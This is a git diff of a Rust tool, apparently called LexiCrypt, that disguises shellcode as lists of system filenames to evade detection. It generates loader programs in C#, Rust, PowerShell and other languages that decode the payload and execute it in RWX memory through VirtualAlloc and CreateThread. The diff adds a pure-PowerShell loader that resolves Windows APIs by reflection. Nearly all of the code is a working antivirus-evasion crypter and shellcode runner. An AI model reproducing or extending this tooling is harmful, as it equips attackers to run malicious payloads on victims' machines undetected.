@@ -1,6 +1,7 @@
 use std::path::{Path, PathBuf};
 use std::fs;
 use std::collections::HashSet;
+use std::io::{BufRead, BufReader};
 use rand::seq::SliceRandom;
 use clap::{Arg, Command};
 
@@ -9,13 +10,11 @@ struct Args {
     input_file: PathBuf,
     output_file: PathBuf,
     template_name: String,
+    wordlist_path: Option<PathBuf>
 }
 
 fn parse_args() -> Args {
-    let matches = Command::new("WordCipher")
-        .version("1.0")
-        .author("Your Name <your.email@example.com>")
-        .about("Encrypts shellcode and generates output in different programming languages")
+    let matches = Command::new("LexiCrypt")
         .arg(
             Arg::new("input")
                 .short('i')
@@ -43,19 +42,30 @@ fn parse_args() -> Args {
                 .num_args(1)
                 .required(true)
         )
+        .arg(
+            Arg::new("wordlist")
+                .short('w')
+                .long("wordlist")
+                .value_name("WORDLIST_DIR")
+                .help("Path to the directory containing the wordlist (default: /usr/bin/ on Linux, C:\\Windows\\System32 on Windows)")
+                .num_args(1)
+                .required(false)
+        )
         .get_matches();
 
     Args {
         input_file: PathBuf::from(matches.get_one::<String>("input").unwrap()),
         output_file: PathBuf::from(matches.get_one::<String>("output").unwrap()),
         template_name: matches.get_one::<String>("template").unwrap().to_string(),
+        wordlist_path: matches.get_one::<String>("wordlist").map(PathBuf::from)
     }
 
     
 }
 
 fn get_words(dir_path: &Path) -> std::io::Result<Vec<String>> {
-    let mut unique_names = HashSet::new();
+    
+    let mut unique_names: HashSet<String> = HashSet::new();
     
     for entry in fs::read_dir(dir_path)? {
         let entry = entry?;
@@ -80,6 +90,30 @@ fn get_words(dir_path: &Path) -> std::io::Result<Vec<String>> {
     }
 
     Ok(names)
+}
+
+fn get_words_from_file(file_path: &Path) -> std::io::Result<Vec<String>> {
+    let file = fs::File::open(file_path)?;
+    let reader = BufReader::new(file);
+    let mut unique_words: HashSet<String> = HashSet::new();
+
+    for line in reader.lines() {
+        if let Ok(word) = line {
+            unique_words.insert(word);
+        }
+    }
+
+    let mut words: Vec<_> = unique_words.into_iter().collect();
+    println!("Found {} unique words", words.len());
+
+    words.shuffle(&mut rand::thread_rng());
+    words.truncate(256);
+
+    println!("First 5 words in list:");
+    for (i, word) in words.iter().take(5).enumerate() {
+        println!("Word[{}] = {}", i, word);
+    }
+    Ok(words)
 }
 
 fn encode_shellcode(shellcode: &[u8], word_list: &[String]) -> Vec<String> {
@@ -128,11 +162,12 @@ fn generate_output(encoded: &[String], word_list: &[String], template: &str) -> 
             encoded_str, 
             wordlist_str
         ),
-    
-"rust" => format!(
+        
+        "rust" => format!(
     r#"
 use std::ptr;
 use std::mem;
+use std::io::BufReader;
 
 #[link(name = "kernel32")]
 extern "system" {{
@@ -199,7 +234,8 @@ fn main() {{
 }}"#,
     encoded_str, 
     wordlist_str
-),    
+        ),    
+
         "csharp" => format!(
             "using System;\nusing System.Collections.Generic;\nusing System.Runtime.InteropServices;\n\nclass Program {{\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr RtlMoveMemory(IntPtr dest, byte[] src, uint size);\n\n    const uint MEM_COMMIT = 0x1000;\n    const uint MEM_RESERVE = 0x2000;\n    const uint PAGE_EXECUTE_READWRITE = 0x40;\n\n    static byte[] Decode(string[] encodedWords, string[] wordList) {{\n        var shellcode = new List<byte>();\n        Console.WriteLine(\"[+] Decoding shellcode...\");\n\n        foreach (var word in encodedWords) {{\n            var index = Array.IndexOf(wordList, word);\n            if (index != -1) {{\n                shellcode.Add((byte)index);\n            }}\n        }}\n\n        return shellcode.ToArray();\n    }}\n\n    static void Main() {{\n        string[] encodedWords = new string[] {{ {} }};\n        string[] wordList = new string[] {{ {} }};\n\n        byte[] shellcode = Decode(encodedWords, wordList);\n        Console.WriteLine($\"[+] Decoded {{shellcode.Length}} bytes\");\n\n        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n        Console.WriteLine(\"[+] Memory allocated\");\n\n        RtlMoveMemory(addr, shellcode, (uint)shellcode.Length);\n        Console.WriteLine(\"[+] Shellcode copied\");\n\n        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n        Console.WriteLine(\"[+] Thread created\");\n\n        WaitForSingleObject(hThread, 0xFFFFFFFF);\n    }}\n}}",
             encoded_str,
@@ -218,6 +254,7 @@ fn main() {{
             encoded_str,
             wordlist_str
         ),
+
         "powershell" => format!(
             r#"
             $VrtAlloc = @"
@@ -277,16 +314,171 @@ fn main() {{
             encoded_str,
             wordlist_str
         ),
+
+        // Alternative PowerShell implementation using pure PowerShell (no C# inline compilation)
+        "powershell_alt" => format!(
+            r#"
+$EncodedWords = @({})
+$WordList = @({})
+
+function Decode-Shellcode {{
+    Write-Host "[+] Decoding shellcode..."
+    $Shellcode = New-Object byte[] $EncodedWords.Count
+    
+    for($i = 0; $i -lt $EncodedWords.Count; $i++) {{
+        $word = $EncodedWords[$i]
+        for($j = 0; $j -lt $WordList.Count; $j++) {{
+            if($WordList[$j] -eq $word) {{
+                $Shellcode[$i] = [byte]$j
+                break
+            }}
+        }}
+    }}
+    
+    return $Shellcode
+}}
+
+function Invoke-Shellcode {{
+    $Shellcode = Decode-Shellcode
+    Write-Host "[+] Decoded $($Shellcode.Length) bytes"
+
+    # Define required functions
+    $Kernel32 = @{{
+        VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+            (Get-ProcAddress kernel32.dll VirtualAlloc),
+            (Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
+        )
+        CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+            (Get-ProcAddress kernel32.dll CreateThread),
+            (Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
+        )
+        WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+            (Get-ProcAddress kernel32.dll WaitForSingleObject),
+            (Get-DelegateType @([IntPtr], [UInt32]) ([UInt32]))
+        )
+    }}
+
+    # Allocate memory
+    $Memory = $Kernel32.VirtualAlloc.Invoke(
+        [IntPtr]::Zero,
+        $Shellcode.Length,
+        0x3000, # MEM_COMMIT | MEM_RESERVE
+        0x40    # PAGE_EXECUTE_READWRITE
+    )
+
+    if($Memory -eq [IntPtr]::Zero) {{
+        throw "Failed to allocate memory"
+    }}
+    Write-Host "[+] Memory allocated at 0x$($Memory.ToString('X8'))"
+
+    # Copy shellcode
+    [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Memory, $Shellcode.Length)
+    Write-Host "[+] Shellcode copied to memory"
+
+    # Create thread
+    $Thread = $Kernel32.CreateThread.Invoke(
+        [IntPtr]::Zero,
+        0,
+        $Memory,
+        [IntPtr]::Zero,
+        0,
+        [IntPtr]::Zero
+    )
+
+    if($Thread -eq [IntPtr]::Zero) {{
+        throw "Failed to create thread"
+    }}
+    Write-Host "[+] Thread created"
+
+    # Wait for completion
+    $Kernel32.WaitForSingleObject.Invoke($Thread, 0xFFFFFFFF)
+    Write-Host "[+] Execution completed"
+}}
+
+# Helper functions for PowerShell API access
+function Get-ProcAddress {{
+    Param(
+        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
+        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
+    )
+
+    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+        Where-Object {{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }}
+    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([Runtime.InteropServices.HandleRef], [String]))
+    $Kern32Handle = [System.Runtime.InteropServices.HandleRef]::new((New-Object IntPtr), ($UnsafeNativeMethods.GetMethod('GetModuleHandle')).Invoke($null, @($Module)))
+    $GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$Kern32Handle, $Procedure))
+}}
+
+function Get-DelegateType {{
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $Parameters,
+        [Parameter(Position = 1)] [Type] $ReturnType = [Void]
+    )
+
+    $Domain = [AppDomain]::CurrentDomain
+    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+    $TypeBuilder.CreateType()
+}}
+
+# Execute the shellcode
+try {{
+    Invoke-Shellcode
+}} catch {{
+    Write-Host "[-] Error: $_" -ForegroundColor Red
+}}
+            "#,
+            encoded_str,
+            wordlist_str
+        ),
         _ => panic!("Unsupported template")
     }
 
 }
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
+    if std::env::args().len() == 1 {
+        // hardcoded this because I'm not sure how to do it with clap. 
+        println!(r#"
+Usage: LexiCrypt.exe [OPTIONS] --input <INPUT_FILE> --output <OUTPUT_FILE> --template <TEMPLATE>
+
+Options:
+  -i, --input <INPUT_FILE>       Path to the input shellcode file
+  -o, --output <OUTPUT_FILE>     Path to the output file
+  -t, --template <TEMPLATE>      The output template format (e.g., cpp, rust, csharp, go, wsh (VBScript))
+  -w, --wordlist <WORDLIST_DIR>  Path to the directory containing the wordlist (default: /usr/bin/ on Linux, C:\Windows\System32 on Windows)
+  -h, --help                     Print help")
+"#);
+        return Ok(());
+    }
+
     let args = parse_args();
+    
+    // If you're reading this, and can think of a better way to do this, let me know.
+    if args.template_name != "cpp" && args.template_name != "rust" && args.template_name != "csharp" && args.template_name != "go" && args.template_name != "wsh" && args.template_name != "powershell" && args.template_name != "powershell_alt" {
+        return Err("Unsupported template".into());
+    }
 
     println!("Generating wordlist...");
-    let wordlist = get_words(Path::new(r"C:\Windows\System32"))?;
+    
+    let wordlist = if let Some(wordlist_path) = &args.wordlist_path {
+        println!("Using custom wordlist directory: {:?}", wordlist_path);
+        get_words_from_file(wordlist_path)?
+    } else if cfg!(target_os = "linux") {
+        println!("Using /usr/bin/ as wordlist directory");
+        get_words(Path::new("/usr/bin/"))?
+    } else {
+        println!("Using C:\\Windows\\System32 as wordlist directory");
+        get_words(Path::new("C:\\Windows\\System32"))?
+    };
+
     if wordlist.len() != 256 {
         return Err("Failed to get exactly 256 words".into());
     }
